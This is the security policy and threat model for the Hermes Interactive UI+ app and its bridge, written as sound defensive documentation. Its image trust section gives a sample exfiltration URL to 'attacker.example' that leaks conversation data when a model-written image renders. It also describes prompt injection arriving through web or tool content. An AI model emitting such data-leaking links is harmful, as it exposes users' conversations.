# Security policy

## Supported versions

Hermes Interactive UI+ is a community project. Security fixes land on `main` and in the latest release. Older builds are not patched.

## Reporting a vulnerability

Please do not open a public issue for security problems.

Report privately through GitHub: on the repository page open **Security** and choose **Report a vulnerability**. If that is unavailable, email robby@robbyczesany.com with "Security" in the subject.

Include what you found and where, steps to reproduce, the impact as you understand it, and the app and bridge versions. Redact real tokens and hostnames; use placeholders.

We aim to acknowledge reports within 7 days. This is a volunteer project, so fixes may take longer. We will keep you informed and credit you if you wish.

## Threat model (summary)

This is a short description of what the project protects and where the trust boundaries are. It is not a formal audit.

### What you are protecting

Your Hermes API key, the bridge tokens, your conversations and attachments, and the capabilities of the Hermes host. **Hermes can run terminal and file tools: whoever can talk to your Hermes API as an authorized client can use them.** Protecting access to the Hermes host and the bridge is therefore the main security goal.

### Network exposure: stay on your tailnet

- Run the bridge so that it is reachable only from your own devices. **We recommend Tailscale** (`tailscale serve`, never `funnel`), or a trusted LAN.
- Do not expose the bridge or the Hermes API server to the public internet.
- Use HTTPS between devices and the bridge. The bridge itself speaks HTTP and listens on loopback by default.
- The bridge refuses requests for host names other than `BRIDGE_PUBLIC_URL` / `BRIDGE_ALLOWED_HOSTS`, which blocks DNS-rebinding pages.

### Device tokens

- The app never receives the Hermes API key. It holds a **per-device token** issued by the bridge.
- Pairing QR codes and links carry a **one-time pairing code**, never a token. The app exchanges the code for its own device token the first time it connects; the code works once and expires after one hour if unused. The admin token is not put into them by default.
- Remote pairing needs a one-time code (10 minutes, single use, lockout after 5 wrong tries).
- Devices can be listed and revoked at any time; a revoked device is locked out within seconds. Tokens are compared in constant time and stored on the device in secure storage.
- Treat a QR code like a password. Do not share screenshots.

### Model output is untrusted

- Answers may contain text from web pages or tool results, including prompt-injection attempts. The app treats the structured answer format as data: it validates node and action types, shows unknown types as a neutral card, and never evaluates model output as code. The calculator uses its own expression parser, not `eval`.
- Actions that touch the device or other people (calendar, reminders, calls, messages, email, timers) require your confirmation in a sheet. URLs and email addresses are validated first.
- Hermes approval requests are shown in the app and answered by you.

### Sandboxed HTML widgets

Model-written HTML widgets run in an isolated WebView or iframe with an opaque origin, no access to app storage, a Content Security Policy that only allows scripts and styles from a short list of CDNs, and blocked navigation. They can send a chat message or copy text through a narrow API; they cannot use device capabilities.

### Image trust policy

Model-written image URLs could be used to leak conversation data (`https://attacker.example/p.png?d=...` is fetched as soon as the image renders). Therefore only these images load automatically: Wikimedia and Wikipedia hosts, images resolved by your own bridge, images fetched through your bridge's image proxy (`GET /bridge/img`: public HTTPS hosts only, no cookies or referrer, the host sees the bridge's address), attachments served by your own server, and local or inline images. Images from any other host show a tap-to-load placeholder with the host name. A setting can switch unknown hosts to "always load"; leave it on "ask" unless you accept the risk.

### Bridge endpoints

All bridge routes require a valid token except the health check, the one-time pair-code exchange (rate limited), the pairing page (loopback or one-time page code), the static web app files and the HMAC-signed Hermes hook. WebSocket upgrades are rejected. Uploads are limited by size and MIME allow-list and deleted after a retention period (7 days by default). The bridge does not forward `Origin`, `Referer` or `Cookie` headers to Hermes. Default logs contain no message content.

## Known limits

- Anyone who gets a valid device token for your bridge can use your Hermes. Revoke lost devices.
- The web app stores its token in the browser's local storage for its origin (no secure store on the web). Serve it only on an origin you trust.
- Do not build a distributed app with `EXPO_PUBLIC_*` secrets: they are compiled into the bundle.
- Push previews pass through Google or Apple when enabled; they are off by default.

## Out of scope

Hermes Agent itself (report to Nous Research), third-party model and speech providers, and misconfigured infrastructure you operate yourself, such as a publicly exposed API server.
